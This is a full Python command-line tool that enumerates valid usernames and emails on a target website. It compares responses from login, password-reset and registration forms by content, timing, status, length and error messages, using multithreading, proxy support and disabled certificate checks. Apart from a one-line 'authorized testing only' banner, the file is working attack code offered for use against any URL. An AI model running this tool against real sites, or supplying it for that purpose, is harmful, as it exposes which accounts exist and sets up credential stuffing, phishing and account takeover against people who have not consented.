#!/usr/bin/env python3
"""
User Enumeration Script
For authorized security testing only.

Enumerates valid usernames through various techniques:
- Response content analysis
- Response timing analysis
- Response status code analysis
- Response size analysis
- Error message analysis
- Rate limit behavior analysis
- Password reset enumeration
- Registration enumeration

Usage:
    python3 enum-users.py -t https://target.com/login -U users.txt
    python3 enum-users.py -t https://target.com/login -U users.txt --method timing
    python3 enum-users.py -t https://target.com/forgot-password -U users.txt --method reset
"""

import argparse
import requests
import json
import re
import time
import sys
import threading
import statistics
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import urlparse, urljoin
import warnings

warnings.filterwarnings('ignore')

# ============================================================================
# CONFIGURATION
# ============================================================================

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
DEFAULT_TIMEOUT = 15
DEFAULT_THREADS = 5
TIMING_SAMPLES = 5  # Number of timing samples per username

# ============================================================================
# OUTPUT FORMATTING
# ============================================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'


class Logger:
    verbose = False

    @staticmethod
    def info(msg: str):
        print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

    @staticmethod
    def success(msg: str):
        print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

    @staticmethod
    def warning(msg: str):
        print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

    @staticmethod
    def error(msg: str):
        print(f"{Colors.RED}[-]{Colors.END} {msg}")

    @staticmethod
    def debug(msg: str):
        if Logger.verbose:
            print(f"{Colors.CYAN}[D]{Colors.END} {msg}")

    @staticmethod
    def found(username: str, method: str, details: str = ""):
        print(f"{Colors.GREEN}[FOUND]{Colors.END} {Colors.BOLD}{username}{Colors.END} ({method}) {details}")


# ============================================================================
# BASE ENUMERATOR
# ============================================================================

class BaseEnumerator:
    """Base class for user enumeration"""

    def __init__(self, target: str, username_field: str = 'username',
                 password_field: str = 'password', threads: int = DEFAULT_THREADS,
                 proxy: str = None, headers: Dict[str, str] = None):
        self.target = target
        self.username_field = username_field
        self.password_field = password_field
        self.threads = threads
        self.proxy = proxy
        self.custom_headers = headers or {}

        self.valid_users = []
        self.probable_users = []
        self.lock = threading.Lock()
        self.tested = 0

        # Session setup
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': DEFAULT_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        self.session.headers.update(self.custom_headers)

        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    def _get_csrf_token(self) -> Optional[str]:
        """Fetch CSRF token from form"""
        try:
            response = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)

            # Common CSRF patterns
            patterns = [
                r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)["\']',
                r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
                r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']',
                r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
            ]

            for pattern in patterns:
                match = re.search(pattern, response.text, re.I)
                if match:
                    return match.group(1)

        except requests.exceptions.RequestException:
            pass

        return None

    def _make_request(self, username: str, password: str = "invalid_password_12345") -> requests.Response:
        """Make authentication request"""
        data = {
            self.username_field: username,
            self.password_field: password
        }

        return self.session.post(
            self.target,
            data=data,
            timeout=DEFAULT_TIMEOUT,
            verify=False,
            allow_redirects=True
        )

    def enumerate(self, usernames: List[str]) -> List[str]:
        """Override in subclasses"""
        raise NotImplementedError


# ============================================================================
# RESPONSE CONTENT ENUMERATOR
# ============================================================================

class ResponseContentEnumerator(BaseEnumerator):
    """Enumerate users via response content differences"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.baseline_response = None
        self.baseline_content = None

    def _establish_baseline(self):
        """Get baseline response for invalid user"""
        Logger.info("Establishing baseline response...")

        invalid_user = f"definitely_invalid_user_{int(time.time())}"
        try:
            self.baseline_response = self._make_request(invalid_user)
            self.baseline_content = self.baseline_response.text
            Logger.info(f"Baseline response length: {len(self.baseline_content)}")
            Logger.info(f"Baseline status code: {self.baseline_response.status_code}")
        except requests.exceptions.RequestException as e:
            Logger.error(f"Failed to establish baseline: {e}")
            raise

    def _check_user(self, username: str) -> Optional[str]:
        """Check if username exists via response content"""
        try:
            response = self._make_request(username)

            with self.lock:
                self.tested += 1
                if self.tested % 50 == 0:
                    Logger.info(f"Progress: {self.tested} tested, {len(self.valid_users)} found")

            # Compare responses
            differences = []

            # Status code difference
            if response.status_code != self.baseline_response.status_code:
                differences.append(f"status:{response.status_code}")

            # Length difference (significant = >5%)
            len_diff = abs(len(response.text) - len(self.baseline_content))
            if len_diff > len(self.baseline_content) * 0.05:
                differences.append(f"length:{len(response.text)}")

            # Content differences
            if response.text != self.baseline_content:
                # Check for specific patterns
                invalid_patterns = ['invalid user', 'user not found', 'no account', 'does not exist']
                valid_patterns = ['invalid password', 'wrong password', 'incorrect password', 'password is incorrect']

                response_lower = response.text.lower()
                baseline_lower = self.baseline_content.lower()

                for pattern in valid_patterns:
                    if pattern in response_lower and pattern not in baseline_lower:
                        differences.append(f"pattern:{pattern}")

            if differences:
                Logger.found(username, "content", f"[{', '.join(differences)}]")
                return username

        except requests.exceptions.RequestException as e:
            Logger.debug(f"Request failed for {username}: {e}")

        return None

    def enumerate(self, usernames: List[str]) -> List[str]:
        """Enumerate users via response content analysis"""
        Logger.info("Starting response content enumeration...")

        self._establish_baseline()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._check_user, u): u for u in usernames}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.lock:
                        self.valid_users.append(result)

        return self.valid_users


# ============================================================================
# TIMING ENUMERATOR
# ============================================================================

class TimingEnumerator(BaseEnumerator):
    """Enumerate users via response timing differences"""

    def __init__(self, *args, samples: int = TIMING_SAMPLES, **kwargs):
        super().__init__(*args, **kwargs)
        self.samples = samples
        self.baseline_timing = None
        self.timing_threshold = None

    def _establish_baseline(self):
        """Establish timing baseline with invalid users"""
        Logger.info("Establishing timing baseline...")

        timings = []
        for i in range(self.samples * 2):
            invalid_user = f"invalid_user_{int(time.time())}_{i}"
            try:
                start = time.time()
                self._make_request(invalid_user)
                elapsed = time.time() - start
                timings.append(elapsed)
                time.sleep(0.2)
            except requests.exceptions.RequestException:
                continue

        if not timings:
            raise RuntimeError("Could not establish timing baseline")

        self.baseline_timing = statistics.mean(timings)
        std_dev = statistics.stdev(timings) if len(timings) > 1 else 0

        # Threshold: baseline + 2 standard deviations + 50%
        self.timing_threshold = self.baseline_timing + (2 * std_dev) + (self.baseline_timing * 0.5)

        Logger.info(f"Baseline timing: {self.baseline_timing:.3f}s")
        Logger.info(f"Standard deviation: {std_dev:.3f}s")
        Logger.info(f"Detection threshold: {self.timing_threshold:.3f}s")

    def _check_user(self, username: str) -> Optional[Tuple[str, float]]:
        """Check if username exists via timing"""
        timings = []

        for _ in range(self.samples):
            try:
                start = time.time()
                self._make_request(username)
                elapsed = time.time() - start
                timings.append(elapsed)
                time.sleep(0.1)
            except requests.exceptions.RequestException:
                continue

        if not timings:
            return None

        avg_timing = statistics.mean(timings)

        with self.lock:
            self.tested += 1
            if self.tested % 20 == 0:
                Logger.info(f"Progress: {self.tested} tested")

        # Check if timing exceeds threshold
        if avg_timing > self.timing_threshold:
            Logger.found(username, "timing", f"[{avg_timing:.3f}s vs baseline {self.baseline_timing:.3f}s]")
            return (username, avg_timing)

        Logger.debug(f"{username}: {avg_timing:.3f}s")
        return None

    def enumerate(self, usernames: List[str]) -> List[str]:
        """Enumerate users via timing analysis"""
        Logger.info("Starting timing-based enumeration...")
        Logger.warning("This method is slower but more stealthy")

        self._establish_baseline()

        # Use fewer threads for timing-based enumeration
        threads = min(self.threads, 3)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self._check_user, u): u for u in usernames}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.lock:
                        self.valid_users.append(result[0])

        return self.valid_users


# ============================================================================
# ERROR MESSAGE ENUMERATOR
# ============================================================================

class ErrorMessageEnumerator(BaseEnumerator):
    """Enumerate users via error message differences"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.invalid_user_errors = []

    def _establish_baseline(self):
        """Collect error messages for invalid users"""
        Logger.info("Collecting error message patterns...")

        for i in range(5):
            invalid_user = f"invalid_user_{int(time.time())}_{i}"
            try:
                response = self._make_request(invalid_user)

                # Extract error messages
                errors = self._extract_errors(response.text)
                self.invalid_user_errors.extend(errors)

            except requests.exceptions.RequestException:
                continue

        self.invalid_user_errors = list(set(self.invalid_user_errors))
        Logger.info(f"Identified {len(self.invalid_user_errors)} error patterns for invalid users")

    def _extract_errors(self, html: str) -> List[str]:
        """Extract error messages from HTML"""
        errors = []

        # Common error container patterns
        patterns = [
            r'<div[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>([^<]+)</div>',
            r'<span[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>([^<]+)</span>',
            r'<p[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>([^<]+)</p>',
            r'"error"\s*:\s*"([^"]+)"',
            r'"message"\s*:\s*"([^"]+)"',
            r'<div[^>]*class=["\'][^"\']*alert[^"\']*["\'][^>]*>([^<]+)</div>',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, html, re.I)
            errors.extend([m.strip() for m in matches if m.strip()])

        return errors

    def _check_user(self, username: str) -> Optional[str]:
        """Check if username exists via error message"""
        try:
            response = self._make_request(username)
            errors = self._extract_errors(response.text)

            with self.lock:
                self.tested += 1
                if self.tested % 50 == 0:
                    Logger.info(f"Progress: {self.tested} tested")

            # Check for different error messages
            for error in errors:
                error_lower = error.lower()

                # Patterns that suggest user exists
                exists_patterns = [
                    'invalid password',
                    'wrong password',
                    'incorrect password',
                    'password is incorrect',
                    'password does not match',
                    'password incorrect'
                ]

                for pattern in exists_patterns:
                    if pattern in error_lower:
                        Logger.found(username, "error_message", f'["{error[:50]}..."]')
                        return username

                # Check if error is different from invalid user errors
                if error not in self.invalid_user_errors and error not in [e.lower() for e in self.invalid_user_errors]:
                    Logger.found(username, "error_message", f'[Different error: "{error[:50]}..."]')
                    return username

        except requests.exceptions.RequestException as e:
            Logger.debug(f"Request failed for {username}: {e}")

        return None

    def enumerate(self, usernames: List[str]) -> List[str]:
        """Enumerate users via error message analysis"""
        Logger.info("Starting error message enumeration...")

        self._establish_baseline()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._check_user, u): u for u in usernames}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.lock:
                        self.valid_users.append(result)

        return self.valid_users


# ============================================================================
# PASSWORD RESET ENUMERATOR
# ============================================================================

class PasswordResetEnumerator(BaseEnumerator):
    """Enumerate users via password reset functionality"""

    def __init__(self, target: str, email_field: str = 'email', *args, **kwargs):
        super().__init__(target, *args, **kwargs)
        self.email_field = email_field
        self.baseline_response = None

    def _establish_baseline(self):
        """Get baseline response for invalid email"""
        Logger.info("Establishing baseline for password reset...")

        invalid_email = f"invalid_{int(time.time())}@nonexistent-domain-12345.com"
        try:
            response = self.session.post(
                self.target,
                data={self.email_field: invalid_email},
                timeout=DEFAULT_TIMEOUT,
                verify=False
            )
            self.baseline_response = response
            Logger.info(f"Baseline status: {response.status_code}, length: {len(response.text)}")
        except requests.exceptions.RequestException as e:
            Logger.error(f"Failed to establish baseline: {e}")
            raise

    def _check_user(self, email: str) -> Optional[str]:
        """Check if email/user exists via password reset"""
        try:
            response = self.session.post(
                self.target,
                data={self.email_field: email},
                timeout=DEFAULT_TIMEOUT,
                verify=False
            )

            with self.lock:
                self.tested += 1
                if self.tested % 50 == 0:
                    Logger.info(f"Progress: {self.tested} tested")

            differences = []

            # Status code
            if response.status_code != self.baseline_response.status_code:
                differences.append(f"status:{response.status_code}")

            # Length
            len_diff = abs(len(response.text) - len(self.baseline_response.text))
            if len_diff > 50:  # More than 50 chars difference
                differences.append(f"length_diff:{len_diff}")

            # Content patterns
            success_patterns = [
                'email sent', 'reset link', 'check your email',
                'instructions sent', 'password reset email',
                'we\'ve sent', 'check your inbox'
            ]

            response_lower = response.text.lower()
            for pattern in success_patterns:
                if pattern in response_lower:
                    differences.append(f"success_pattern:{pattern}")

            if differences:
                Logger.found(email, "password_reset", f"[{', '.join(differences)}]")
                return email

        except requests.exceptions.RequestException as e:
            Logger.debug(f"Request failed for {email}: {e}")

        return None

    def enumerate(self, emails: List[str]) -> List[str]:
        """Enumerate users via password reset"""
        Logger.info("Starting password reset enumeration...")

        self._establish_baseline()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._check_user, e): e for e in emails}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.lock:
                        self.valid_users.append(result)

        return self.valid_users


# ============================================================================
# REGISTRATION ENUMERATOR
# ============================================================================

class RegistrationEnumerator(BaseEnumerator):
    """Enumerate users via registration functionality"""

    def __init__(self, target: str, email_field: str = 'email',
                 username_field: str = 'username', *args, **kwargs):
        super().__init__(target, *args, **kwargs)
        self.email_field = email_field
        self.baseline_response = None

    def _check_user(self, username: str) -> Optional[str]:
        """Check if username exists via registration"""
        try:
            # Try to register with the username
            data = {
                self.username_field: username,
                self.email_field: f"test_{int(time.time())}@test.com",
                'password': 'TestPassword123!',
                'password_confirmation': 'TestPassword123!'
            }

            response = self.session.post(
                self.target,
                data=data,
                timeout=DEFAULT_TIMEOUT,
                verify=False
            )

            with self.lock:
                self.tested += 1
                if self.tested % 50 == 0:
                    Logger.info(f"Progress: {self.tested} tested")

            # Check for "username taken" patterns
            taken_patterns = [
                'username already taken',
                'username already exists',
                'username is taken',
                'user already exists',
                'already registered',
                'account already exists',
                'username not available',
                'username unavailable'
            ]

            response_lower = response.text.lower()
            for pattern in taken_patterns:
                if pattern in response_lower:
                    Logger.found(username, "registration", f'["{pattern}"]')
                    return username

        except requests.exceptions.RequestException as e:
            Logger.debug(f"Request failed for {username}: {e}")

        return None

    def enumerate(self, usernames: List[str]) -> List[str]:
        """Enumerate users via registration"""
        Logger.info("Starting registration enumeration...")
        Logger.warning("This method may create accounts - use with caution!")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._check_user, u): u for u in usernames}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.lock:
                        self.valid_users.append(result)

        return self.valid_users


# ============================================================================
# MULTI-METHOD ENUMERATOR
# ============================================================================

class MultiMethodEnumerator:
    """Run multiple enumeration methods and combine results"""

    def __init__(self, target: str, methods: List[str], **kwargs):
        self.target = target
        self.methods = methods
        self.kwargs = kwargs
        self.results = {}

    def enumerate(self, usernames: List[str]) -> Dict[str, List[str]]:
        """Run all specified enumeration methods"""

        for method in self.methods:
            Logger.info(f"\n{'='*50}")
            Logger.info(f"Running {method} enumeration")
            Logger.info(f"{'='*50}\n")

            try:
                if method == 'content':
                    enumerator = ResponseContentEnumerator(self.target, **self.kwargs)
                elif method == 'timing':
                    enumerator = TimingEnumerator(self.target, **self.kwargs)
                elif method == 'error':
                    enumerator = ErrorMessageEnumerator(self.target, **self.kwargs)
                elif method == 'reset':
                    enumerator = PasswordResetEnumerator(self.target, **self.kwargs)
                elif method == 'register':
                    enumerator = RegistrationEnumerator(self.target, **self.kwargs)
                else:
                    Logger.error(f"Unknown method: {method}")
                    continue

                found = enumerator.enumerate(usernames)
                self.results[method] = found

            except Exception as e:
                Logger.error(f"Method {method} failed: {e}")
                self.results[method] = []

        return self.results


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def load_wordlist(filepath: str) -> List[str]:
    """Load usernames from wordlist file"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        Logger.error(f"Wordlist not found: {filepath}")
        sys.exit(1)


def generate_email_variants(username: str, domains: List[str] = None) -> List[str]:
    """Generate email variants from username"""
    if domains is None:
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']

    variants = []
    for domain in domains:
        variants.append(f"{username}@{domain}")

    return variants


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='User Enumeration Script',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Methods:
  content   - Response content analysis (default)
  timing    - Response timing analysis
  error     - Error message analysis
  reset     - Password reset enumeration
  register  - Registration enumeration

Examples:
  # Basic enumeration
  %(prog)s -t https://target.com/login -U users.txt

  # Timing-based enumeration
  %(prog)s -t https://target.com/login -U users.txt --method timing

  # Password reset enumeration
  %(prog)s -t https://target.com/forgot-password -U emails.txt --method reset

  # Multiple methods
  %(prog)s -t https://target.com/login -U users.txt --method content,timing,error

  # Custom fields
  %(prog)s -t https://target.com/login -U users.txt --user-field email --pass-field pwd
        """
    )

    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-U', '--users', required=True, help='Username/email wordlist')
    parser.add_argument('--method', default='content',
                       help='Enumeration method(s): content,timing,error,reset,register')
    parser.add_argument('--user-field', default='username', help='Username field name')
    parser.add_argument('--pass-field', default='password', help='Password field name')
    parser.add_argument('--email-field', default='email', help='Email field name')
    parser.add_argument('--threads', type=int, default=DEFAULT_THREADS, help='Number of threads')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--header', action='append', help='Custom header (Name: Value)')
    parser.add_argument('--output', '-o', help='Output file for found users')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    Logger.verbose = args.verbose

    print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.CYAN}         USER ENUMERATION TOOL{Colors.END}")
    print(f"{Colors.CYAN}       For Authorized Testing Only{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}\n")

    # Load usernames
    usernames = load_wordlist(args.users)
    Logger.info(f"Loaded {len(usernames)} usernames from {args.users}")
    Logger.info(f"Target: {args.target}")

    # Parse custom headers
    headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse methods
    methods = [m.strip() for m in args.method.split(',')]

    # Run enumeration
    kwargs = {
        'username_field': args.user_field,
        'password_field': args.pass_field,
        'threads': args.threads,
        'proxy': args.proxy,
        'headers': headers
    }

    if len(methods) == 1:
        method = methods[0]

        if method == 'content':
            enumerator = ResponseContentEnumerator(args.target, **kwargs)
        elif method == 'timing':
            enumerator = TimingEnumerator(args.target, **kwargs)
        elif method == 'error':
            enumerator = ErrorMessageEnumerator(args.target, **kwargs)
        elif method == 'reset':
            kwargs['email_field'] = args.email_field
            enumerator = PasswordResetEnumerator(args.target, **kwargs)
        elif method == 'register':
            kwargs['email_field'] = args.email_field
            enumerator = RegistrationEnumerator(args.target, **kwargs)
        else:
            Logger.error(f"Unknown method: {method}")
            sys.exit(1)

        found_users = enumerator.enumerate(usernames)
        results = {method: found_users}

    else:
        multi = MultiMethodEnumerator(args.target, methods, **kwargs)
        results = multi.enumerate(usernames)

    # Print summary
    print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}ENUMERATION SUMMARY{Colors.END}")
    print(f"{'='*60}\n")

    all_found = set()
    for method, users in results.items():
        print(f"{Colors.CYAN}{method}:{Colors.END} {len(users)} users found")
        for user in users:
            print(f"  - {user}")
        all_found.update(users)

    print(f"\n{Colors.GREEN}Total unique users found: {len(all_found)}{Colors.END}")

    # Save results
    if args.output:
        with open(args.output, 'w') as f:
            for user in sorted(all_found):
                f.write(f"{user}\n")
        Logger.success(f"Results saved to: {args.output}")

    # Print all found users
    if all_found:
        print(f"\n{Colors.BOLD}All found users:{Colors.END}")
        for user in sorted(all_found):
            print(f"  {user}")


if __name__ == '__main__':
    main()
